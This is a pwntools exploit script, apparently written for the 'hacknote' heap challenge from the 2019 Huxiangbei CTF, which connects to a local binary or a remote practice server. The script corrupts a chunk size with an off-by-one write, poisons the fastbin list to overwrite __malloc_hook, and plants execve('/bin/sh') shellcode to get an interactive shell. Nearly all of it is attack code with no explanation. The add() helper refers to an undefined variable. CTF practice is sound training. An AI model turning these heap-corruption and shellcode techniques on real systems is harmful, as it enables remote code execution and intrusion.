#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda x:p.sendline(x)
sd = lambda x:p.send(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process("./huxiangbei_2019_hacknote")
	elf = ELF("./huxiangbei_2019_hacknote")
else:
	p = remote('node3.buuoj.cn',25731)
	#elf = ELF("./")

def menu(cmd):
    sla("-----------------\n",str(cmd))

def add(sz,ct):
    menu(1)
    sla('Input the Size:\n',str(sz))
    if(len(ct)==size):
        sda("Input the Note:",ct)
    else:
        sla("Input the Note:",ct)

def edit(idx,ct):
    menu(3)
    sla("Input the Index of Note:",str(idx))
    sda("Input the Note:",ct)

def delete(idx):
    menu(2)
    sla("Input the Index of Note:",str(idx))

malloc_hook = 0x6CB788
fake_chunk = malloc_hook - 0x16
shellcode = '\x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xd2\x48\x31\xf6\xb0\x3b\x0f\x05'



add(0x18,'AAAAAAAA')#0
add(0x60,'BBBBBBBB')#1
add(0x30,'CCCCCCCC')#2
add(0x10,'DDDDDDDD')#3

edit(0,'A'*0x18)
payload = 'A' * 0x18 + '\xb1'
edit(0,payload)

delete(2)
delete(1)

payload = 'A' * 0x60 + p64(0) + p64(0x41) + p64(fake_chunk)
add(0xa0,payload)

add(0x30,'CCCCCCCC')
payload = 'A' * (0x16 - 0x10) + p64(malloc_hook + 0x8) + shellcode
add(0x30,payload)

ia()